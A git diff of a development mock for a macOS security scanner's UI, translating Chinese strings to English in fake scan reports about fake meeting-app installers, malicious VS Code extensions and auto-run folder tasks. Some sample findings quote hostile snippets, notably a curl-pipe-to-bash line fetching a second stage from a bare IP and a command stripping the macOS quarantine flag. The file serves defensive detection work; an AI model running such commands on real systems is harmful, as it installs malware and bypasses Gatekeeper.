@@ -1,5 +1,6 @@
-// 只在开发时、并且不在 Tauri 里（用普通浏览器打开 vite 地址）时加载：
-// 给界面一套假的后端数据，方便在浏览器里调样式。打包进 App 的版本不会包含这个文件。
+// Loaded only in development and outside Tauri (the vite URL opened in a plain browser):
+// gives the UI a fake backend so styles can be tuned in the browser. The bundled App never includes this file.
+// The text is English because the backend defaults to English.
 
 const now = new Date();
 const ago = (min: number) => {
@@ -18,15 +19,15 @@ const historyEntries = [
     action: "cancelled",
     report: {
       verdict: "block",
-      summary: "这是假会议软件的安装脚本：会删除隔离标记、下载独立的 Node.js，再从一个 IP 地址拉取第二阶段脚本。",
-      reasons: ["下载域名 zeff-meet.app 注册仅 12 天", "脚本把第二阶段藏在 ~/.task 里运行，正常安装程序不会这样做"],
-      advice: "不要运行。如果是“面试官”或“客户”发来的，把这条命令和对方的联系方式一起举报给招聘平台。",
+      summary: "This is a fake meeting app's install script: it removes the quarantine flag, downloads its own Node.js, then fetches a second-stage script from a bare IP address.",
+      reasons: ["The download domain zeff-meet.app was registered only 12 days ago", "The script hides its second stage in ~/.task and runs it there, which normal installers never do"],
+      advice: "Do not run it. If an \"interviewer\" or \"client\" sent it, report this command and their contact details to the hiring platform.",
       source: "ai",
       model: "claude-opus-5-5",
       findings: [
-        { severity: "high", message: "删除 macOS 隔离标记（绕过 Gatekeeper 安全检查）", where: "install.sh", snippet: "xattr -d com.apple.quarantine /Applications/Zeff.app" },
-        { severity: "high", message: "下载域名 zeff-meet.app 注册仅 12 天", where: "https://zeff-meet.app/install.sh" },
-        { severity: "medium", message: "脚本里又下载并执行了别的脚本（多阶段投递）", where: "install.sh", snippet: "curl -s http://198.51.100.9:1224/task/mac | bash" },
+        { severity: "high", message: "Removes the macOS quarantine flag (bypasses Gatekeeper security checks)", where: "install.sh", snippet: "xattr -d com.apple.quarantine /Applications/Zeff.app" },
+        { severity: "high", message: "The download domain zeff-meet.app was registered only 12 days ago", where: "https://zeff-meet.app/install.sh" },
+        { severity: "medium", message: "The script downloads and runs another script (multi-stage delivery)", where: "install.sh", snippet: "curl -s http://198.51.100.9:1224/task/mac | bash" },
       ],
     },
   },
@@ -39,12 +40,12 @@ const historyEntries = [
     action: "notified",
     report: {
       verdict: "warn",
-      summary: "安装包没有开发者签名，也没有经过苹果公证。",
+      summary: "The installer has no developer signature and is not notarized by Apple.",
       reasons: [],
       advice: "",
       source: "offline",
       model: "",
-      findings: [{ severity: "medium", message: "应用没有开发者签名", where: "Zeff.app" }],
+      findings: [{ severity: "medium", message: "The app has no developer signature", where: "Zeff.app" }],
     },
   },
   {
@@ -54,7 +55,7 @@ const historyEntries = [
     title: "npm install",
     cwd: "/Users/oliver/code/online-store",
     action: "executed",
-    report: { verdict: "allow", summary: "依赖都来自 npm 官方源，没有发现可疑的安装脚本。", reasons: [], advice: "", source: "ai", model: "claude-opus-5-5", findings: [] },
+    report: { verdict: "allow", summary: "All dependencies come from the official npm registry; no suspicious install scripts found.", reasons: [], advice: "", source: "ai", model: "claude-opus-5-5", findings: [] },
   },
   {
     id: "4",
@@ -66,22 +67,22 @@ const historyEntries = [
     quarantine_id: "q1",
     report: {
       verdict: "block",
-      summary: "扩展代码里藏着 64 个不可见字符，解码后会读取 ~/.ssh。",
+      summary: "The extension hides 64 invisible characters in its code that decode to code reading ~/.ssh.",
       reasons: [],
       advice: "",
       source: "offline",
       model: "",
-      findings: [{ severity: "high", message: "代码里藏着一串连续 64 个不可见的 Unicode 字符", where: "extension.js" }],
+      findings: [{ severity: "high", message: "The code hides a run of 64 consecutive invisible Unicode characters", where: "extension.js" }],
     },
   },
   {
     id: "5",
     time: ago(60 * 50),
     source: "ai_tool",
-    title: "Claude Code · fetch-helper（MCP server）",
+    title: "Claude Code · fetch-helper (MCP server)",
     cwd: "",
     action: "allowed",
-    report: { verdict: "allow", summary: "固定了版本的官方包。", reasons: [], advice: "", source: "offline", model: "", findings: [] },
+    report: { verdict: "allow", summary: "An official package pinned to a version.", reasons: [], advice: "", source: "offline", model: "", findings: [] },
   },
 ];
 
@@ -98,10 +99,10 @@ const config = {
 };
 
 const quarantine = [
-  { id: "q1", original: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2", stored: "", time: ago(60 * 26), reason: "扩展代码里藏着不可见字符" },
+  { id: "q1", original: "/Users/oliver/.vscode/extensions/themes-darcula-pro-1.0.2", stored: "", time: ago(60 * 26), reason: "The extension hides invisible characters in its code" },
 ];
 
-// 地址里带 ?paused 时以暂停状态打开，方便看暂停的样子
+// With ?paused in the URL it opens paused, to preview the paused look
 let paused = location.search.includes("paused");
 
 const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
@@ -118,7 +119,7 @@ const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
     downloads_dir: "/Users/oliver/Downloads",
     extension_dirs: ["/Users/oliver/.vscode/extensions", "/Users/oliver/.cursor/extensions"],
     provider: "claude_cli",
-    provider_label: "Claude Code 账号 · claude-opus-5-5",
+    provider_label: "Claude Code account · claude-opus-5-5",
     ai_available: true,
     sandbox_available: true,
     recent: { total: 128, warned: 6, blocked: 2 },
@@ -133,10 +134,10 @@ const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
   intel_status: () => ({
     updated: ago(200),
     sources: [
-      { id: "ossf", name: "OpenSSF 恶意包", license: "Apache-2.0", url: "", version: "", updated: "", count: 231842 },
-      { id: "vscode", name: "VS Code 恶意扩展名单", license: "-", url: "", version: "", updated: "", count: 412 },
-      { id: "elastic", name: "Elastic YARA 规则", license: "Elastic License 2.0", url: "", version: "", updated: "", count: 1288 },
-      { id: "xprotect", name: "本机 XProtect", license: "Apple", url: "", version: "", updated: "", count: 391 },
+      { id: "ossf", name: "OpenSSF Malicious Packages", license: "Apache-2.0", url: "", version: "", updated: "", count: 231842 },
+      { id: "vscode", name: "VS Code malicious extension list", license: "-", url: "", version: "", updated: "", count: 412 },
+      { id: "elastic", name: "Elastic YARA rules", license: "Elastic License 2.0", url: "", version: "", updated: "", count: 1288 },
+      { id: "xprotect", name: "XProtect on this Mac", license: "Apple", url: "", version: "", updated: "", count: 391 },
     ],
   }),
   detect_claude_cli: () => "/Users/oliver/.local/bin/claude",
@@ -146,7 +147,7 @@ const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
       setTimeout(
         () =>
           r([
-            { id: "themes.darcula-pro", path: "/x/a", verdict: "warn", findings: [{ severity: "medium", message: "启动即激活，并调用系统命令", where: "extension.js" }] },
+            { id: "themes.darcula-pro", path: "/x/a", verdict: "warn", findings: [{ severity: "medium", message: "Activates on startup and runs system commands", where: "extension.js" }] },
             { id: "ms-python.python", path: "/x/b", verdict: "allow", findings: [] },
           ]),
         900,
@@ -163,8 +164,8 @@ const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
             unchanged: 31,
             truncated: false,
             hits: [
-              { path: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg", kind: "installer", verdict: "block", summary: "安装镜像的隐藏目录里藏着一个没有签名的可执行程序", findings: [{ severity: "high", message: "安装镜像的隐藏目录里藏着一个可执行程序 .back/installer", where: "Zeff.dmg" }], fresh: true },
-              { path: "/Users/oliver/Downloads/interview-task", kind: "project", verdict: "warn", summary: "VS Code 打开这个文件夹时会自动执行任务", findings: [{ severity: "medium", message: "VS Code 打开这个文件夹时会自动执行任务（runOn: folderOpen）", where: ".vscode/tasks.json" }], fresh: false },
+              { path: "/Users/oliver/Downloads/Zeff-Meeting-2.4.dmg", kind: "installer", verdict: "block", summary: "An unsigned executable is hidden in a hidden folder of the disk image", findings: [{ severity: "high", message: "An executable is hidden in a hidden folder of the disk image: .back/installer", where: "Zeff.dmg" }], fresh: true },
+              { path: "/Users/oliver/Downloads/interview-task", kind: "project", verdict: "warn", summary: "VS Code runs a task automatically when this folder is opened", findings: [{ severity: "medium", message: "VS Code runs a task automatically when this folder is opened (runOn: folderOpen)", where: ".vscode/tasks.json" }], fresh: false },
             ],
           }),
         1200,
@@ -182,7 +183,7 @@ let callbackId = 0;
     if (cmd.startsWith("plugin:event|")) return ++callbackId;
     const h = handlers[cmd];
     if (!h) {
-      console.info("[devMock] 没有模拟的命令", cmd, args);
+      console.info("[devMock] no mock for command", cmd, args);
       return null;
     }
     return h(args);
